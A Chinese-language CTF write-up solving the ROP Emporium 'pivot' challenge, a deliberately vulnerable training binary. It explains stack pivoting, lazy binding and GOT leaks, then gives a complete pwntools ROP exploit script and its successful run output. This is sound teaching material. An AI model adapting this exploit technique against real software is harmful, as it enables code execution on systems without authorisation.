---
title: pivot
published: 2026-05-25
image: ""
tags: [pwn]
category: pwn
draft: false
series: ROP Emporium
---

# 题目描述

这道题最不同于之前的题的地方，就在于原栈上空间很小，需要利用 gadgets 把 rsp 跳到其他地方来继续利用 rop 链达到目的。达到目的的方法题目也说的比较清楚：利用惰性绑定性质通过 got 表项找到动态库中 foothold_function() 的真实地址，再通过偏移量解析到库中 ret2win() 函数的真实地址

# 解题流程

## 工具

`pwntools`、`ropper`

## 找函数地址、gadgets

跑一下程序

```terminal
./pivot

pivot by ROP Emporium
x86_64

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x70390fffef10
Send a ROP chain now and it will land there
> 
```

贴心地给了我们应该把rsp放到的地址

但注意，虽然这个系列的题都是`No PIE`，但每次运行程序时打印出的这个地址可能还是会变，所以后续就需要让脚本去`动态读取`到这个地址来作为rsp跳转的地址



然后是反汇编

```terminal
objdump -d -M intel ./pivot
```

找到：

```terminal
0000000000400720 <foothold_function@plt>

00000000004009bb <usefulGadgets>:
  4009bb:       58                      pop    rax
  4009bc:       c3                      ret
  4009bd:       48 94                   xchg   rsp,rax
  4009bf:       c3                      ret
  4009c0:       48 8b 00                mov    rax,QWORD PTR [rax]
  4009c3:       c3                      ret
  4009c4:       48 01 e8                add    rax,rbp
  4009c7:       c3                      ret
  4009c8:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
  4009cf:       00 
```

`foothold_function@plt`在`第一次`调用后其作为入口指向的真实函数地址便存入了`foothold_function@got`所存的内容中，即`[foothold_function@got]`

而`xchg rsp,rax；ret`、`mov rax,QWORD PTR [rax]；ret`和`add rax,rbp`便是我们要找的关键指令，其含义分别为：

> 将rsp和rax内容交换
>
> 把 RAX 当成一个地址，
> 去这个地址指向的内存里读 8 字节，
> 再把读出来的值放回 RAX
>
> 将rbp的值加到rax

第一条指令用来将 rsp 转移到新地方

第二条指令将 rax 内容由`地址`变成该地址指向的`8字节内容`，用来后续读取`foothold_function@got`再好不过

第三条指令显然就是用来做偏移量的

**也就是说，只要把目标转移地址放入 rax，再执行第一条指令，一交换，rsp 便来到了`目标转移地址`，同时在惰性绑定后，我们也可以通过把`foothold_function@got`放入 rax 执行第二条指令来读到`foothold_function`的真实地址，最后第三条指令加上rbp作偏移量(变相性说明这题rbp是有讲究的)，就能访问到ret2win()了**，至于怎么用到此时rax里的地址，就需要：

```terminal
ropper --file ./pivot --search "jmp rax"
ropper --file ./pivot --search "call rax"

0x00000000004007c1: jmp rax;
0x00000000004006b0: call rax;
```

虽然call会多一个`push返回地址`的操作，但在这道题两者都能达到目的

> 这里不能反推出“栈对齐不重要”，只能说明本题 ret2win 的执行路径中，call rax 和 jmp rax 造成的 RSP 差异都没有触发致命问题。以前遇到的额外 ret 对齐，更多是为了避免某些 libc 函数或 movaps 这类指令对栈对齐敏感

**不过，CTF里只要flag打出来，后面崩不崩通常不重要()**

那现在就是找`偏移量`了

先是找到`foothold_function@got`

```terminal
objdump -R ./pivot | grep foothold

0000000000601040 R_X86_64_JUMP_SLOT  foothold_function
```

再是在`libpivot.so`的符号表中对应查看库内符号偏移来算固定偏移量

```terminal
readelf -s ./libpivot.so | grep -E "foothold|ret2win"

 10: 000000000000096a    19 FUNC    GLOBAL DEFAULT   12 foothold_function
 18: 0000000000000a81   146 FUNC    GLOBAL DEFAULT   12 ret2win
 48: 0000000000000a81   146 FUNC    GLOBAL DEFAULT   12 ret2win
 55: 000000000000096a    19 FUNC    GLOBAL DEFAULT   12 foothold_function
```

两组地址我们看一组即可，来算偏移量

```
0xa81 - 0x96a = 0x117
```

## 构造exp脚本

根据我们的思路，分两次输入

第一次输入被写到程序给出的 pivot 地址处，作为之后要执行的大 rop 链
这条大链负责调用`foothold_function@plt`触发`lazy binding`再从`got`中取出`foothold_function`的`真实地址`
加上 ret2win 与 foothold_function 在 libpivot.so 中的`固定偏移`
最后跳到 ret2win

第二次输入发生在原栈上，空间较小
它只负责用`pop rax; ret`把`pivot`地址放入`rax`，再用`xchg rsp, rax; ret`把 rsp 切换到第一次输入的位置
切换后，后续 ret 就会从 pivot 区域继续取地址执行大链

所以脚本大概就长这样

```python
from pwn import *

p = process('./pivot')


p.recvuntil(b'pivot: ')
pivot_addr = int(p.recvline().strip(), 16)


padding_to_saved_rbp = 32

pop_rax_ret = 0x4009bb
xchg_rsp_rax_ret = 0x4009bd
mov_rax_qword_ptr_rax_ret = 0x4009c0
add_rax_rbp_ret = 0x4009c4
jmp_rax = 0x4007c1

foothold_function_plt = 0x400720
foothold_function_got = 0x601040
ret2win_offset = 0x117

payload1 = b''
payload1 += p64(foothold_function_plt)
payload1 += p64(pop_rax_ret)
payload1 += p64(foothold_function_got)
payload1 += p64(mov_rax_qword_ptr_rax_ret)
payload1 += p64(add_rax_rbp_ret)
payload1 += p64(jmp_rax)

p.sendlineafter(b'> ', payload1)

payload2 = b'A' * padding_to_saved_rbp
payload2 += p64(ret2win_offset)
payload2 += p64(pop_rax_ret)
payload2 += p64(pivot_addr)
payload2 += p64(xchg_rsp_rax_ret)

p.sendlineafter(b'> ', payload2)

p.interactive()
```

运行

```python
python3 pivot.py

[+] Starting local process './pivot': pid 154866
[*] Switching to interactive mode
[*] Process './pivot' stopped with exit code 0 (pid 154866)
Thank you!
foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$  
```

出来了，不赖

# 总结

+ `NO PIE`变化的不是`foothold_function@got`，而是`[foothold_function@got]`

+ `stack pivot`不是把数据“搬到新栈”，而是把`rsp`改到一块已经准备好的`可控内存`

  因此顺序必须是：

1. 先把大 rop 链写到 pivot 地址
2. 再在原栈上用小 rop 链修改 rsp
3. `xchg rsp,rax;ret`后，ret 会从`pivot`地址继续取下一条

​       如果 pivot 地址处还没有提前布置链，rsp 搬过去后 ret 只会读到垃圾

+ 动态库是单独的`elf文件`，但程序运行时会被加载进同一个进程虚拟地址空间
  主程序、动态库、堆、栈都在同一张虚拟内存地图上，只是位于不同区域；动态库不是简单变成一整块连续内存，而是按 ELF 的可加载段映射成若干块，不同块有不同权限，如 r-x、r--、rw-

+ `plt`是主程序里的外部函数跳板，`got`是主程序里保存外部函数真实地址的表
  `惰性绑定`意味着外部函数第一次被调用时才解析真实地址，并写入`got`

+ `pivot`里的“新栈”不是真正新建的系统栈，
  而是一块程序给出的`可写内存`
  只要把 rsp 改到那里，ret/pop 就会从那里继续取数据
  原栈和新栈通常不连续，但这不影响 rop 链执行

+ 为什么最后到ret2win函数不能再用 xchg rsp, rax; ret？

  因为 ret 做的是  = [rsp]，不是 rip = rsp
  所以当 rax = ret2win 地址时，需要 jmp rax / call rax，而不是 xchg rsp, rax; ret